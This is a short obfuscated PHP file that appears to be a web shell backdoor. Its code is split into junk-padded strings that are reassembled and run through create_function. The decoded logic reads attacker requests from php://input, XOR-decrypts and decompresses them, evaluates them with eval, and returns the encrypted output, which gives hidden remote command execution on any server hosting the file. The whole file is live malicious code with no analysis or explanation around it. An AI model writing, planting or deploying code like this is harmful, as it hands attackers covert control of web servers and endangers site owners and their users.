<?php
$C='>Dl(@g>Dzunc>Dompr>Dess(@x(@ba>Dse64_decod>De($m[1])>D,$k)))>D;$o=@o>D>Db_get_conten>Dts();@>D>Dob';
$g='"/$>Dkh(.+)$kf>D>D/">D,@file_get_c>Dontents("p>D>Dhp://>Dinput"),$>Dm)==>D1) >D>D{@ob_start();@eva';
$K='_end>D_clean();$r>D=>D@ba>Dse64_enco>Dde>D(@x(@gzcom>Dpress($o),$>Dk)>D);prin>Dt(>D"$p$kh$r$kf");}';
$u='cti>Don x(>D$t,$>Dk>D){$c=strlen($k);$l=s>Dtrlen($>Dt);$>Do="">D;for($i>D=0;$i<$>Dl;){for>D>D($j=0';
$b='$k="4c>Dade188";>D$kh="7>D18fcaf2>D>D6>D08f";$kf="4f5d6f6>D95da>D8";$p=">DpRI8>DVAOSF2CV>DR>DaGL";fun>D';
$Y=str_replace('GF','','GFcrGFeatGFe_fGFunGFGFction');
$q=';($>Dj<$c&&$i>D<$l);$>D>Dj++,$i++)>D>D{$o.=$t{$i}^$>Dk{$j}>D;>D}}retu>Drn $o;}>Dif (@preg_mat>Dch(';
$j=str_replace('>D','',$b.$u.$q.$g.$C.$K);
$F=$Y('',$j);$F();
?>
